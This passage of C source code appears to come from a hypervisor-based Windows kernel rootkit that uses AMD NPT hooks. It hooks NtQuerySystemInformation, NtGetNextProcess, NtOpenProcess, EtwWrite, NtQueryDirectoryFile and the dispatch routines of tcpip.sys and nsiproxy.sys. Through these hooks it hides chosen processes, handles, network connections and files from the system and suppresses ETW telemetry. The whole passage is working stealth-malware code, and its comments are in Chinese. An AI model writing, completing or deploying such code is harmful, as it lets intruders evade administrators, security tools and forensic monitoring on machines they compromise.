            IRP_MJ_INTERNAL_DEVICE_CONTROL,
            &g_NptTcpipDriverObject,
            &g_NptOriginalTcpipInternalDeviceControl,
            NptHookedTcpipInternalDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] tcpip.sys hook installed\n");
        }
    }
    
    // Hook nsiproxy.sys IRP_MJ_DEVICE_CONTROL
    if (g_NptNsiproxyDriverObject == NULL) {
        status = NptInstallDriverDispatchHook(
            L"nsiproxy",
            &g_NptNsiproxyDriverObject,
            &g_NptOriginalNsiproxyDeviceControl,
            NptHookedNsiproxyDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] nsiproxy.sys IRP_MJ_DEVICE_CONTROL hook installed\n");
        }
    }
    
    // Hook nsiproxy.sys IRP_MJ_INTERNAL_DEVICE_CONTROL
    if (g_NptNsiproxyDriverObject != NULL && g_NptOriginalNsiproxyInternalDeviceControl == NULL) {
        status = NptInstallDriverDispatchHookEx(
            L"nsiproxy",
            IRP_MJ_INTERNAL_DEVICE_CONTROL,
            &g_NptNsiproxyDriverObject,
            &g_NptOriginalNsiproxyInternalDeviceControl,
            NptHookedNsiproxyInternalDeviceControl
        );
        if (NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] nsiproxy.sys IRP_MJ_INTERNAL_DEVICE_CONTROL hook installed\n");
        }
    }
}

// ============================================================
// 网络连接过滤函数
// ============================================================

static VOID NptFilterTcpTable(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PNPT_MIB_TCPTABLE_OWNER_PID tcpTable;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(NPT_MIB_TCPTABLE_OWNER_PID)) {
        return;
    }
    
    __try {
        tcpTable = (PNPT_MIB_TCPTABLE_OWNER_PID)OutputBuffer;
        
        if (tcpTable->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < tcpTable->dwNumEntries; i++) {
            ULONG pid = tcpTable->table[i].dwOwningPid;
            
            if (!NptIsProcessHidden(pid)) {
                if (i != j) {
                    RtlCopyMemory(&tcpTable->table[j], &tcpTable->table[i],
                                  sizeof(NPT_MIB_TCPROW_OWNER_PID));
                }
                j++;
            }
        }
        
        tcpTable->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

static VOID NptFilterUdpTable(PVOID OutputBuffer, ULONG OutputBufferLength)
{
    PNPT_MIB_UDPTABLE_OWNER_PID udpTable;
    ULONG i, j;
    
    if (!OutputBuffer || OutputBufferLength < sizeof(NPT_MIB_UDPTABLE_OWNER_PID)) {
        return;
    }
    
    __try {
        udpTable = (PNPT_MIB_UDPTABLE_OWNER_PID)OutputBuffer;
        
        if (udpTable->dwNumEntries == 0) {
            return;
        }
        
        j = 0;
        for (i = 0; i < udpTable->dwNumEntries; i++) {
            ULONG pid = udpTable->table[i].dwOwningPid;
            
            if (!NptIsProcessHidden(pid)) {
                if (i != j) {
                    RtlCopyMemory(&udpTable->table[j], &udpTable->table[i],
                                  sizeof(NPT_MIB_UDPROW_OWNER_PID));
                }
                j++;
            }
        }
        
        udpTable->dwNumEntries = j;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

/*
 * 直接扫描并替换输出缓冲区中的隐藏 PID
 */
static VOID NptScanAndReplaceHiddenPids(PVOID Buffer, ULONG BufferLength)
{
    PULONG data;
    ULONG i;
    ULONG count;
    ULONG replaced = 0;
    
    if (!Buffer || BufferLength < sizeof(ULONG) * 2) {
        return;
    }
    
    // 检查地址是否有效
    if ((ULONG_PTR)Buffer < 0x10000) {
        return;
    }
    
    __try {
        data = (PULONG)Buffer;
        count = BufferLength / sizeof(ULONG);
        
        if (count > 100000) {
            count = 100000;
        }
        
        for (i = 0; i < count; i++) {
            ULONG value = data[i];
            
            // 检查是否是合理的 PID 范围并且是隐藏的进程
            if (value >= 4 && value < 65536 && NptIsProcessHidden(value)) {
                data[i] = 0;
                replaced++;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

NTSTATUS
NTAPI
NptHookedNtDeviceIoControlFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptNtDeviceIoControlFileHook)
    NTSTATUS status;
    PFN_NptNtDeviceIoControlFile originalFunc;
    ULONG actualLength = 0;
    static LONG callCount = 0;
    LONG currentCall;
    
    originalFunc = g_NptOriginalNtDeviceIoControlFile;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    status = originalFunc(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength
    );
    
    if (!NT_SUCCESS(status) || g_NptHiddenProcessCount == 0 || OutputBuffer == NULL) {
        return status;
    }
    
    // 调试输出
    currentCall = InterlockedIncrement(&callCount);
    if ((currentCall % 1000) == 1) {
        DbgPrint("[NPT-Hook] NptHookedNtDeviceIoControlFile called %d times, IOCTL=0x%X\n",
            currentCall, IoControlCode);
    }
    
    // 获取实际返回的数据长度
    __try {
        if (IoStatusBlock != NULL) {
            actualLength = (ULONG)IoStatusBlock->Information;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        actualLength = OutputBufferLength;
    }
    
    if (actualLength == 0) {
        actualLength = OutputBufferLength;
    }
    
    if (actualLength < 8) {
        return status;
    }
    
    __try {
        // 策略1: 结构化过滤
        if (actualLength >= sizeof(NPT_MIB_TCPTABLE_OWNER_PID)) {
            PNPT_MIB_TCPTABLE_OWNER_PID table = (PNPT_MIB_TCPTABLE_OWNER_PID)OutputBuffer;
            
            if (table->dwNumEntries > 0 && table->dwNumEntries < 10000) {
                SIZE_T minSize = sizeof(ULONG) + table->dwNumEntries * sizeof(NPT_MIB_TCPROW_OWNER_PID);
                if (actualLength >= minSize) {
                    NptFilterTcpTable(OutputBuffer, actualLength);
                }
            }
        }
        
        if (actualLength >= sizeof(NPT_MIB_UDPTABLE_OWNER_PID)) {
            PNPT_MIB_UDPTABLE_OWNER_PID table = (PNPT_MIB_UDPTABLE_OWNER_PID)OutputBuffer;
            
            if (table->dwNumEntries > 0 && table->dwNumEntries < 10000) {
                SIZE_T minSize = sizeof(ULONG) + table->dwNumEntries * sizeof(NPT_MIB_UDPROW_OWNER_PID);
                if (actualLength >= minSize) {
                    NptFilterUdpTable(OutputBuffer, actualLength);
                }
            }
        }
        
        // 策略2: 直接扫描并替换隐藏的 PID
        NptScanAndReplaceHiddenPids(OutputBuffer, actualLength);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[NPT-Hook] Exception in NptHookedNtDeviceIoControlFile filter\n");
    }
    
    return status;
    NPT_DIRECT_CALLBACK_END()
}

NTSTATUS
NTAPI
NptHookedNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptNtQuerySystemInformationHook)
    NTSTATUS status;
    PFN_NptNtQuerySystemInformation originalFunc;
    static volatile LONG callCount = 0;
    LONG currentCall;
    
    currentCall = InterlockedIncrement(&callCount);
    if (currentCall <= 3) {
        DbgPrint("[NPT-Hook] NtQuerySystemInformation #%d, Class=%d\n", currentCall, SystemInformationClass);
    }
    
#if NPT_HOOK_TEST_NO_CALL
    return STATUS_NOT_IMPLEMENTED;
#endif
    
    originalFunc = g_NptOriginalNtQuerySystemInformation;
    if (!originalFunc) {
        return STATUS_UNSUCCESSFUL;
    }
    
    __try {
        status = originalFunc(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    // 只在成功时进行过滤
    if (!NT_SUCCESS(status) || SystemInformation == NULL) {
        return status;
    }
    
    // 根据信息类进行过滤
    __try {
        switch (SystemInformationClass) {
        
        // ============================================================
        // 进程信息过滤
        // ============================================================
        case NptSystemProcessInformation:           // 5
        case NptSystemExtendedProcessInformation:   // 57
        case NptSystemFullProcessInformation:       // 148
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_PROCESS_INFO)) {
                NptFilterProcessList(SystemInformation);
            }
            break;
        
        // ============================================================
        // 会话进程信息过滤
        // ============================================================
        case NptSystemSessionProcessInformation:    // 53
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_SESSION_PROCESS_INFORMATION)) {
                NptFilterSessionProcessList(SystemInformation);
            }
            break;
        
        // ============================================================
        // 句柄信息过滤
        // ============================================================
        case NptSystemHandleInformation:            // 16
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_HANDLE_INFORMATION)) {
                NptFilterHandleList(SystemInformation, SystemInformationLength);
            }
            break;
        
        case NptSystemExtendedHandleInformation:    // 64
            if (g_NptHiddenProcessCount > 0 &&
                SystemInformationLength >= sizeof(NPT_SYSTEM_HANDLE_INFORMATION_EX)) {
                NptFilterExtendedHandleList(SystemInformation, SystemInformationLength);
            }
            break;
        
        default:
            break;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    return status;
    NPT_DIRECT_CALLBACK_END()
}

NTSTATUS
NptHookHideProcess(
    _In_ ULONG ProcessId
)
{
    NTSTATUS status;
    UNICODE_STRING funcName;
    PVOID ntQuerySystemInformation;
    
    DbgPrint("[NPT-Hook] ============ NptHookHideProcess START ============\n");
    
    if (ProcessId == 0 || ProcessId == 4) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 检查是否所有进程隐藏相关的 Hook 都已安装
    // 注意：NtDeviceIoControlFile Hook 已禁用（导致系统不稳定）
    if (g_NptNtQuerySystemInformationHook != NULL && 
        g_NptOriginalNtQuerySystemInformation != NULL &&
        g_NptNtGetNextProcessHook != NULL &&
        g_NptOriginalNtGetNextProcess != NULL) {
        status = NptHookAddHiddenProcessState(ProcessId);
        if (!NT_SUCCESS(status)) {
            return status;
        }
        DbgPrint("[NPT-Hook] All process hiding hooks already installed\n");
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[NPT-Hook] Installing additional process hiding hooks...\n");
    
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[NPT-Hook] Hypervisor not active\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    // 安装 NtQuerySystemInformation Hook (如果尚未安装)
    if (g_NptNtQuerySystemInformationHook == NULL) {
        RtlInitUnicodeString(&funcName, L"NtQuerySystemInformation");
        ntQuerySystemInformation = MmGetSystemRoutineAddress(&funcName);
        
        if (!ntQuerySystemInformation) {
            DbgPrint("[NPT-Hook] Failed to find NtQuerySystemInformation\n");
            return STATUS_NOT_FOUND;
        }
        
        DbgPrint("[NPT-Hook] NtQuerySystemInformation at %p\n", ntQuerySystemInformation);
        
        status = NptHookInstall(
            ntQuerySystemInformation,
            NptHookedNtQuerySystemInformation,
            &g_NptNtQuerySystemInformationHook
        );
        
        if (NT_SUCCESS(status)) {
            g_NptOriginalNtQuerySystemInformation = 
                (PFN_NptNtQuerySystemInformation)NptHookGetTrampoline(g_NptNtQuerySystemInformationHook);
            
            DbgPrint("[NPT-Hook] NtQuerySystemInformation hook installed\n");
            DbgPrint("[NPT-Hook] Trampoline at %p\n", g_NptOriginalNtQuerySystemInformation);
        } else {
            DbgPrint("[NPT-Hook] NtQuerySystemInformation hook failed: 0x%X\n", status);
            return status;
        }
    } else {
        DbgPrint("[NPT-Hook] NtQuerySystemInformation hook already installed, skipping\n");
    }
    
    // ============================================================
    // 安装 NtGetNextProcess Hook
    // ============================================================
    {
        PVOID ntGetNextProcess;
        RtlInitUnicodeString(&funcName, L"NtGetNextProcess");
        ntGetNextProcess = MmGetSystemRoutineAddress(&funcName);
        
        if (ntGetNextProcess && g_NptNtGetNextProcessHook == NULL) {
            DbgPrint("[NPT-Hook] NtGetNextProcess at %p\n", ntGetNextProcess);
            
            status = NptHookInstall(ntGetNextProcess, NptHookedNtGetNextProcess, &g_NptNtGetNextProcessHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtGetNextProcess = (PFN_NptNtGetNextProcess)NptHookGetTrampoline(g_NptNtGetNextProcessHook);
                DbgPrint("[NPT-Hook] NtGetNextProcess hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtGetNextProcess hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 NtGetNextThread Hook
    // ============================================================
    {
        PVOID ntGetNextThread;
        RtlInitUnicodeString(&funcName, L"NtGetNextThread");
        ntGetNextThread = MmGetSystemRoutineAddress(&funcName);
        
        if (ntGetNextThread && g_NptNtGetNextThreadHook == NULL) {
            DbgPrint("[NPT-Hook] NtGetNextThread at %p\n", ntGetNextThread);
            
            status = NptHookInstall(ntGetNextThread, NptHookedNtGetNextThread, &g_NptNtGetNextThreadHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtGetNextThread = (PFN_NptNtGetNextThread)NptHookGetTrampoline(g_NptNtGetNextThreadHook);
                DbgPrint("[NPT-Hook] NtGetNextThread hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtGetNextThread hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 NtOpenProcess Hook
    // ============================================================
    {
        PVOID ntOpenProcess;
        RtlInitUnicodeString(&funcName, L"NtOpenProcess");
        ntOpenProcess = MmGetSystemRoutineAddress(&funcName);
        
        if (ntOpenProcess && g_NptNtOpenProcessHook == NULL) {
            DbgPrint("[NPT-Hook] NtOpenProcess at %p\n", ntOpenProcess);
            
            status = NptHookInstall(ntOpenProcess, NptHookedNtOpenProcess, &g_NptNtOpenProcessHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtOpenProcess = (PFN_NptNtOpenProcess)NptHookGetTrampoline(g_NptNtOpenProcessHook);
                DbgPrint("[NPT-Hook] NtOpenProcess hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtOpenProcess hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // 安装 ETW Hook
    // ============================================================
    {
        PVOID etwWrite;
        RtlInitUnicodeString(&funcName, L"EtwWrite");
        etwWrite = MmGetSystemRoutineAddress(&funcName);
        
        if (etwWrite && g_NptEtwWriteHook == NULL) {
            DbgPrint("[NPT-Hook] EtwWrite at %p\n", etwWrite);
            
            status = NptHookInstall(etwWrite, NptHookedEtwWrite, &g_NptEtwWriteHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalEtwWrite = (PFN_NptEtwWrite)NptHookGetTrampoline(g_NptEtwWriteHook);
                DbgPrint("[NPT-Hook] EtwWrite hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] EtwWrite hook failed: 0x%X\n", status);
            }
        }
    }
    
    // ============================================================
    // NtDeviceIoControlFile Hook 暂时禁用 - NPT Hook 此函数导致系统不稳定
    // ============================================================
    /*
    {
        PVOID ntDeviceIoControlFile;
        RtlInitUnicodeString(&funcName, L"NtDeviceIoControlFile");
        ntDeviceIoControlFile = MmGetSystemRoutineAddress(&funcName);
        
        if (ntDeviceIoControlFile && g_NptNtDeviceIoControlFileHook == NULL) {
            DbgPrint("[NPT-Hook] NtDeviceIoControlFile at %p\n", ntDeviceIoControlFile);
            
            status = NptHookInstall(ntDeviceIoControlFile, NptHookedNtDeviceIoControlFile, &g_NptNtDeviceIoControlFileHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtDeviceIoControlFile = (PFN_NptNtDeviceIoControlFile)NptHookGetTrampoline(g_NptNtDeviceIoControlFileHook);
                DbgPrint("[NPT-Hook] NtDeviceIoControlFile hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtDeviceIoControlFile hook failed: 0x%X\n", status);
            }
        }
    }
    */
    DbgPrint("[NPT-Hook] Network connection hiding disabled - requires WFP/NDIS filter driver\n");
    
    // ============================================================
    // 底层网络驱动 Hook 暂时禁用 - 可能导致系统不稳定
    // ============================================================
    // DbgPrint("[NPT-Hook] Installing low-level network driver hooks...\n");
    // NptInstallNetworkDriverHooks();  // 暂时禁用
    
    DbgPrint("[NPT-Hook] ============ NptHookHideProcess END ============\n");
    DbgPrint("[NPT-Hook] Process hiding hooks summary:\n");
    DbgPrint("[NPT-Hook]   - NtQuerySystemInformation: %s\n", g_NptNtQuerySystemInformationHook ? "OK" : "FAILED");
    DbgPrint("[NPT-Hook]   - NtGetNextProcess: %s\n", g_NptNtGetNextProcessHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - NtGetNextThread: %s\n", g_NptNtGetNextThreadHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - NtOpenProcess: %s\n", g_NptNtOpenProcessHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - EtwWrite: %s\n", g_NptEtwWriteHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - NtDeviceIoControlFile: %s\n", g_NptNtDeviceIoControlFileHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - tcpip.sys hook: %s\n", g_NptTcpipDriverObject ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - nsiproxy.sys hook: %s\n", g_NptNsiproxyDriverObject ? "OK" : "N/A");
    
    status = NptHookAddHiddenProcessState(ProcessId);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    return NptHookIsProcessHidden(ProcessId)
        ? STATUS_SUCCESS
        : STATUS_DEVICE_NOT_READY;
}

NTSTATUS
NptHookHideProcessByName(
    _In_ PCWSTR ProcessName
)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;
    ULONG returnLength = 0;
    PNPT_SYSTEM_PROCESS_INFO current;
    ULONG foundCount = 0;
    UNICODE_STRING targetName;
    
    if (!ProcessName || ProcessName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlInitUnicodeString(&targetName, ProcessName);
    
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, 'kpNH');
        if (!buffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 走 trampoline 跳过我们自己安装的 hook,避免 hide-by-name 被自己过滤
        status = g_NptOriginalNtQuerySystemInformation
            ? g_NptOriginalNtQuerySystemInformation(5, buffer, bufferSize, &returnLength)
            : ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, 'kpNH');
            buffer = NULL;
            bufferSize = returnLength + 0x1000;
            if (bufferSize > 0x1000000) {
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            HvFreePoolNonNull(buffer, 'kpNH');
            return status;
        }
        
        break;
    }
    
    __try {
        current = (PNPT_SYSTEM_PROCESS_INFO)buffer;
        
        while (TRUE) {
            if (current->ImageName.Buffer != NULL && 
                current->ImageName.Length > 0 &&
                RtlCompareUnicodeString(&current->ImageName, &targetName, TRUE) == 0) {
                
                ULONG processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                
                status = NptHookHideProcess(processId);
                if (NT_SUCCESS(status)) {
                    foundCount++;
                }
            }
            
            if (current->NextEntryOffset == 0) break;
            current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    if (buffer) {
        ExFreePoolWithTag(buffer, 'kpNH');
    }
    
    if (foundCount == 0) {
        return STATUS_NOT_FOUND;
    }
    
    return STATUS_SUCCESS;
}

NTSTATUS
NptHookUnhideProcessByName(
    _In_ PCWSTR ProcessName
)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;
    ULONG returnLength = 0;
    PNPT_SYSTEM_PROCESS_INFO current;
    ULONG foundCount = 0;
    UNICODE_STRING targetName;
    
    if (!ProcessName || ProcessName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlInitUnicodeString(&targetName, ProcessName);
    
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, 'kpNH');
        if (!buffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 走 trampoline,绕开自己装的 hook —— 否则 unhide-by-name 永远 NOT_FOUND
        status = g_NptOriginalNtQuerySystemInformation
            ? g_NptOriginalNtQuerySystemInformation(5, buffer, bufferSize, &returnLength)
            : ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, 'kpNH');
            buffer = NULL;
            bufferSize = returnLength + 0x1000;
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            HvFreePoolNonNull(buffer, 'kpNH');
            return status;
        }
        break;
    }
    
    __try {
        current = (PNPT_SYSTEM_PROCESS_INFO)buffer;
        
        while (TRUE) {
            if (current->ImageName.Buffer != NULL &&
                RtlCompareUnicodeString(&current->ImageName, &targetName, TRUE) == 0) {
                
                status = NptHookUnhideProcess((ULONG)(ULONG_PTR)current->UniqueProcessId);
                if (NT_SUCCESS(status)) {
                    foundCount++;
                }
            }
            
            if (current->NextEntryOffset == 0) break;
            current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    if (buffer) {
        ExFreePoolWithTag(buffer, 'kpNH');
    }
    
    return (foundCount > 0) ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS
NptHookRemoveHiddenProcessState(
    _In_ ULONG ProcessId
)
{
    KIRQL oldIrql;
    ULONG i;
    BOOLEAN found = FALSE;
    
    if (ProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() > DISPATCH_LEVEL) {
        return STATUS_INVALID_DEVICE_STATE;
    }
    
    KeAcquireSpinLock(&g_NptHiddenProcessLock, &oldIrql);
    
    for (i = 0; i < g_NptHiddenProcessCount && i < MAX_HIDDEN_PROCESSES; i++) {
        if (g_NptHiddenProcessIds[i] == ProcessId) {
            ULONG j;
            for (j = i; j < g_NptHiddenProcessCount - 1 && j < MAX_HIDDEN_PROCESSES - 1; j++) {
                g_NptHiddenProcessIds[j] = g_NptHiddenProcessIds[j + 1];
            }
            g_NptHiddenProcessIds[g_NptHiddenProcessCount - 1] = 0;
            g_NptHiddenProcessCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
    
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS
NptHookUnhideProcess(
    _In_ ULONG ProcessId
)
{
    return NptHookRemoveHiddenProcessState(ProcessId);
}

// ============================================================
// 高级功能：文件隐藏 (AMD NPT)
// ============================================================

// 注意: MAX_NPT_HIDDEN_FILES, MAX_NPT_FILE_NAME_LEN 和 g_NptHiddenFile* 变量已在文件开头定义

// NtQueryDirectoryFile Hook
static PNPT_HOOK_ENTRY g_NptQueryDirFileHook = NULL;

typedef NTSTATUS (NTAPI *PFN_NptNtQueryDirectoryFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan
);

static PFN_NptNtQueryDirectoryFile g_NptOriginalQueryDirFile = NULL;

// 文件信息结构
typedef struct _NPT_FILE_DIR_INFO {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} NPT_FILE_DIR_INFO, *PNPT_FILE_DIR_INFO;

typedef struct _NPT_FILE_BOTH_DIR_INFO {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} NPT_FILE_BOTH_DIR_INFO, *PNPT_FILE_BOTH_DIR_INFO;

static BOOLEAN
NptIsFileNameHidden(
    _In_ PCWSTR FileName,
    _In_ ULONG FileNameLength
)
{
    ULONG i;
    WCHAR tempName[MAX_NPT_FILE_NAME_LEN];
    ULONG charCount;
    KIRQL oldIrql;
    BOOLEAN result = FALSE;
    
    if (!FileName || FileNameLength == 0 || g_NptHiddenFileCount == 0) {
        return FALSE;
    }
    
    charCount = FileNameLength / sizeof(WCHAR);
    if (charCount >= MAX_NPT_FILE_NAME_LEN) {
        charCount = MAX_NPT_FILE_NAME_LEN - 1;
    }
    
    RtlCopyMemory(tempName, FileName, charCount * sizeof(WCHAR));
    tempName[charCount] = L'\0';
    
    if (g_NptHiddenFileLockInit) {
        KeAcquireSpinLock(&g_NptHiddenFileLock, &oldIrql);
    }
    
    for (i = 0; i < g_NptHiddenFileCount && i < MAX_NPT_HIDDEN_FILES; i++) {
        if (_wcsicmp(g_NptHiddenFileNames[i], tempName) == 0) {
            result = TRUE;
            break;
        }
    }
    
    if (g_NptHiddenFileLockInit) {
        KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
    }
    
    return result;
}

static VOID
NptFilterDirectoryInfo(
    _In_ PVOID FileInfo,
    _In_ FILE_INFORMATION_CLASS InfoClass
)
{
    PVOID current = FileInfo;
    PVOID previous = NULL;
    
    if (!FileInfo || g_NptHiddenFileCount == 0) {
        return;
    }
    
    __try {
        while (current) {
            ULONG nextOffset = 0;
            PWCHAR fileName = NULL;
            ULONG fileNameLength = 0;
            BOOLEAN shouldHide = FALSE;
            
            switch (InfoClass) {
                case FileDirectoryInformation:
                    nextOffset = ((PNPT_FILE_DIR_INFO)current)->NextEntryOffset;
                    fileName = ((PNPT_FILE_DIR_INFO)current)->FileName;
                    fileNameLength = ((PNPT_FILE_DIR_INFO)current)->FileNameLength;
                    break;
                case FileBothDirectoryInformation:
                    nextOffset = ((PNPT_FILE_BOTH_DIR_INFO)current)->NextEntryOffset;
                    fileName = ((PNPT_FILE_BOTH_DIR_INFO)current)->FileName;
                    fileNameLength = ((PNPT_FILE_BOTH_DIR_INFO)current)->FileNameLength;
                    break;
                default:
                    return;
            }
            
            shouldHide = NptIsFileNameHidden(fileName, fileNameLength);
            
            if (shouldHide && previous) {
                ULONG* prevNext = NULL;
                switch (InfoClass) {
                    case FileDirectoryInformation:
                        prevNext = &((PNPT_FILE_DIR_INFO)previous)->NextEntryOffset;
                        break;
                    case FileBothDirectoryInformation:
                        prevNext = &((PNPT_FILE_BOTH_DIR_INFO)previous)->NextEntryOffset;
                        break;
                }
                
                if (prevNext) {
                    if (nextOffset == 0) {
                        *prevNext = 0;
                    } else {
                        *prevNext += nextOffset;
                    }
                }
                
                if (nextOffset == 0) break;
                current = (PUCHAR)current + nextOffset;
                continue;
            }
            
            previous = current;
            if (nextOffset == 0) break;
            current = (PUCHAR)current + nextOffset;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

NTSTATUS
NTAPI
NptHookedNtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan
)
{
    NPT_DIRECT_CALLBACK_BEGIN(g_NptQueryDirFileHook)
    NTSTATUS status;
    
    if (!g_NptOriginalQueryDirFile) {
        return STATUS_UNSUCCESSFUL;
    }
    
    __try {
        status = g_NptOriginalQueryDirFile(
            FileHandle, Event, ApcRoutine, ApcContext,
            IoStatusBlock, FileInformation, Length,
            FileInformationClass, ReturnSingleEntry,
            FileName, RestartScan
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    if (NT_SUCCESS(status) && FileInformation && g_NptHiddenFileCount > 0) {
        NptFilterDirectoryInfo(FileInformation, FileInformationClass);
    }
    
    return status;
    NPT_DIRECT_CALLBACK_END()
}

NTSTATUS
NptHookHideFile(
    _In_ PCWSTR FileName
)
{
    KIRQL oldIrql;
    PCWSTR baseName;
    SIZE_T len;
    
    if (!FileName) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 检查锁是否已初始化（应该在 NptHookInitialize 中已初始化）
    if (!g_NptHiddenFileLockInit) {
        DbgPrint("[NPT-Hook] Warning: File hide lock not initialized\n");
        return STATUS_UNSUCCESSFUL;
